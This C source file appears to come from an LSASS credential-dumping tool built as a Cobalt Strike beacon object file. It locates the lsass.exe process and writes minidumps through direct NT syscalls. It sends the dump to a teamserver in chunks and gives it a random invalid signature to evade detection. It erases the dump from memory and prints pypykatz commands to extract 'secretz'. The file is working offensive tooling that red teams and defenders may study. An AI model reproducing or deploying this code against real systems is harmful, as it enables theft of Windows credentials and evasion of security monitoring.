#include "utils.h"
#include "handle.h"
#include "syscalls.h"

BOOL is_full_path(
    LPCSTR filename
)
{
    char c;

    if (filename[0] == filename[1] && filename[1] == '\\')
        return TRUE;

    c = filename[0] | 0x20;
    if (c < 97 || c > 122)
        return FALSE;

    c = filename[1];
    if (c != ':')
        return FALSE;

    c = filename[2];
    if (c != '\\')
        return FALSE;

    return TRUE;
}

VOID get_full_path(
    PUNICODE_STRING full_dump_path,
    LPCSTR filename
)
{
    wchar_t wcFileName[MAX_PATH];

    // add \??\ at the start
    wcscpy(full_dump_path->Buffer, L"\\??\\");
    // if it is just a relative path, add the current directory
    if (!is_full_path(filename))
        wcsncat(full_dump_path->Buffer, get_cwd(), MAX_PATH);
    // convert the path to wide string
    mbstowcs(wcFileName, filename, MAX_PATH);
    // add the file path
    wcsncat(full_dump_path->Buffer, wcFileName, MAX_PATH);
    // set the length fields
    full_dump_path->Length = wcsnlen(full_dump_path->Buffer, MAX_PATH);
    full_dump_path->Length *= 2;
    full_dump_path->MaximumLength = full_dump_path->Length + 2;
}

LPCWSTR get_cwd(VOID)
{
    PVOID pPeb;
    PPROCESS_PARAMETERS pProcParams;

    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
    pProcParams = *RVA(PPROCESS_PARAMETERS*, pPeb, PROCESS_PARAMETERS_OFFSET);
    return pProcParams->CurrentDirectory.DosPath.Buffer;
}

BOOL write_file(
    PUNICODE_STRING full_dump_path,
    PBYTE fileData,
    ULONG32 fileLength
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = fileLength;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        full_dump_path,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // create the file
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
        status == STATUS_OBJECT_NAME_INVALID)
    {
        PRINT_ERR(
            "The path '%ls' is invalid.",
            &full_dump_path->Buffer[4]
        )
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
        return FALSE;
    }
    // write the dump
    status = NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        fileData,
        fileLength,
        NULL,
        NULL
    );
    NtClose(hFile); hFile = NULL;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWriteFile", status);
        PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
        return FALSE;
    }
    DPRINT("The dump has been written to %ls", &full_dump_path->Buffer[4]);
    return TRUE;
}

BOOL create_file(
    PUNICODE_STRING full_dump_path
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        full_dump_path,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // call NtCreateFile with FILE_OPEN_IF
    // FILE_OPEN_IF: If the file already exists, open it. If it does not, create the given file.
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
        status == STATUS_OBJECT_NAME_INVALID ||
        status == STATUS_OBJECT_PATH_SYNTAX_BAD)
    {
        PRINT_ERR(
            "The path '%ls' is invalid.",
            &full_dump_path->Buffer[4]
        )
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        DPRINT_ERR("Could not create file at %ls", &full_dump_path->Buffer[4]);
        return FALSE;
    }
    NtClose(hFile); hFile = NULL;
    DPRINT("File created: %ls", &full_dump_path->Buffer[4]);
    return TRUE;
}

#if defined(NANO) && defined(BOF)

BOOL download_file(
    LPCSTR fileName,
    char fileData[],
    ULONG32 fileLength
)
{
    int fileNameLength = strnlen(fileName, 256);

    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    int messageLength = 8 + fileNameLength;
    char* packedData = intAlloc(messageLength);
    if (!packedData)
    {
        malloc_failed();
        DPRINT_ERR("Could download the dump");
        return FALSE;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(
        CALLBACK_FILE,
        packedData,
        messageLength
    );
    intFree(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + CHUNK_SIZE;
    char* packedChunk = intAlloc(chunkLength);
    if (!packedChunk)
    {
        malloc_failed();
        DPRINT_ERR("Could download the dump");
        return FALSE;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength
        );
        exfiltrated += chunkLength;
    }
    intFree(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4
    );
    DPRINT("The dump was downloaded filessly");
    return TRUE;
}

#endif

BOOL delete_file(
    LPCSTR filepath
)
{
    OBJECT_ATTRIBUTES objAttr;
    wchar_t wcFilePath[MAX_PATH];
    UNICODE_STRING UnicodeFilePath;
    UnicodeFilePath.Buffer = wcFilePath;
    get_full_path(&UnicodeFilePath, filepath);

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        &UnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    NTSTATUS status = NtDeleteFile(&objAttr);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtDeleteFile", status);
        DPRINT_ERR("Could not delete file: %s", filepath);
        return FALSE;
    }
    DPRINT("Deleted file: %s", filepath);
    return TRUE;
}

BOOL file_exists(
    LPCSTR filepath
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = 0;
    wchar_t wcFilePath[MAX_PATH];
    UNICODE_STRING UnicodeFilePath;
    UnicodeFilePath.Buffer = wcFilePath;
    get_full_path(&UnicodeFilePath, filepath);

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        &UnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // call NtCreateFile with FILE_OPEN
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (status == STATUS_OBJECT_NAME_NOT_FOUND)
        return FALSE;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        DPRINT_ERR("Could check if the file %s exists", filepath);
        return FALSE;
    }
    NtClose(hFile); hFile = NULL;
    return TRUE;
}

#if defined(NANO) && !defined(SSP)

BOOL wait_for_process(
    HANDLE hProcess
)
{
    NTSTATUS status = NtWaitForSingleObject(
        hProcess,
        TRUE,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWaitForSingleObject", status);
        DPRINT_ERR("Could not wait for process");
        return FALSE;
    }
    return TRUE;
}

PVOID get_process_image(
    HANDLE hProcess
)
{
    NTSTATUS status;
    ULONG BufferLength = 0x200;
    PVOID buffer;
    do
    {
        buffer = intAlloc(BufferLength);
        if (!buffer)
        {
            malloc_failed();
            DPRINT_ERR("Could not get the image of process");
            return NULL;
        }
        status = NtQueryInformationProcess(
            hProcess,
            ProcessImageFileName,
            buffer,
            BufferLength,
            &BufferLength
        );
        if (NT_SUCCESS(status))
            return buffer;

        intFree(buffer); buffer = NULL;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    syscall_failed("NtQueryInformationProcess", status);
    DPRINT_ERR("Could not get the image of process");
    return NULL;
}

BOOL is_lsass(
    HANDLE hProcess
)
{
    PUNICODE_STRING image = get_process_image(hProcess);
    if (!image)
        return FALSE;

    if (image->Length == 0)
    {
        intFree(image); image = NULL;
        return FALSE;
    }

    if (wcsstr(image->Buffer, L"\\Windows\\System32\\lsass.exe"))
    {
        intFree(image); image = NULL;
        return TRUE;
    }

    intFree(image); image = NULL;
    return FALSE;
}

DWORD get_pid(
    HANDLE hProcess
)
{
    PROCESS_BASIC_INFORMATION basic_info;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryInformationProcess", status);
        return 0;
    }

    return basic_info.UniqueProcessId;
}

/*
 * kill a process by PID
 * used to kill processes created by MalSecLogon
 */
BOOL kill_process(
    DWORD pid
)
{
    if (!pid)
        return FALSE;
    // open a handle with PROCESS_TERMINATE
    HANDLE hProcess = get_process_handle(
        pid,
        PROCESS_TERMINATE,
        FALSE
    );
    if (!hProcess)
    {
        DPRINT_ERR("Failed to kill process with PID: %ld", pid);
        return FALSE;
    }

    NTSTATUS status = NtTerminateProcess(
        hProcess,
        ERROR_SUCCESS
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtTerminateProcess", status);
        DPRINT_ERR("Failed to kill process with PID: %ld", pid);
        return FALSE;
    }
    DPRINT("Killed process with PID: %ld", pid);
    return TRUE;
}

DWORD get_lsass_pid(void)
{
    DWORD lsass_pid;
    HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
    if (!hProcess)
        return 0;
    lsass_pid = get_pid(hProcess);
    NtClose(hProcess); hProcess = NULL;
    if (!lsass_pid)
    {
        DPRINT_ERR("Could not get the PID of " LSASS);
    }
    else
    {
        DPRINT("Found the PID of " LSASS ": %ld", lsass_pid);
    }
    return lsass_pid;
}

#endif

void print_success(
    LPCSTR dump_path,
    BOOL use_valid_sig,
    BOOL write_dump_to_disk
)
{
    if (!use_valid_sig)
    {
        PRINT(
            "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
        )
    }
    if (write_dump_to_disk)
    {
#ifdef BOF
        PRINT(
            "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
            dump_path,
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
        )
#else
        PRINT(
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path
        )
#endif
    }
    else
    {
        PRINT(
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
            dump_path
        )
    }
}

void free_linked_list(
    PVOID head
)
{
    if (!head)
        return;

    Plinked_list node = (Plinked_list)head;
    ULONG32 number_of_nodes = 0;
    while (node)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        Plinked_list node = (Plinked_list)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

PVOID allocate_memory(
    PSIZE_T region_size
)
{
    PVOID base_address = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &base_address,
        0,
        region_size,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status))
    {

        DPRINT_ERR(
            "Could not allocate enough memory to write the dump"
        )
        return NULL;
    }
    DPRINT(
        "Allocated 0x%llx bytes at 0x%p to write the dump",
        (ULONG64)*region_size,
        base_address
    );
    return base_address;
}

void encrypt_dump(
    Pdump_context dc
)
{
    // add your code here
    return;
}

void erase_dump_from_memory(
    Pdump_context dc
)
{
    // delete all trace of the dump from memory
    memset(dc->BaseAddress, 0, dc->rva);
    // free the memory area where the dump was
    PVOID base_address = dc->BaseAddress;
    SIZE_T region_size = 0;
    NTSTATUS status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &base_address,
        &region_size,
        MEM_RELEASE
    );
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtFreeVirtualMemory", status);
        DPRINT_ERR("Could not erased the dump from memory");
    }
    else
    {
        DPRINT("Erased the dump from memory");
    }
}

void generate_invalid_sig(
    PULONG32 Signature,
    PSHORT Version,
    PSHORT ImplementationVersion
)
{
    time_t t;
    srand((unsigned) time(&t));

    *Signature = MINIDUMP_SIGNATURE;
    *Version = MINIDUMP_VERSION;
    *ImplementationVersion = MINIDUMP_IMPL_VERSION;
    while (*Signature == MINIDUMP_SIGNATURE ||
           *Version == MINIDUMP_VERSION ||
           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
    {
        *Signature = 0;
        *Signature |= (rand() & 0x7FFF) << 0x11;
        *Signature |= (rand() & 0x7FFF) << 0x02;
        *Signature |= (rand() & 0x0003) << 0x00;

        *Version = 0;
        *Version |= (rand() & 0xFF) << 0x08;
        *Version |= (rand() & 0xFF) << 0x00;

        *ImplementationVersion = 0;
        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
    }
}
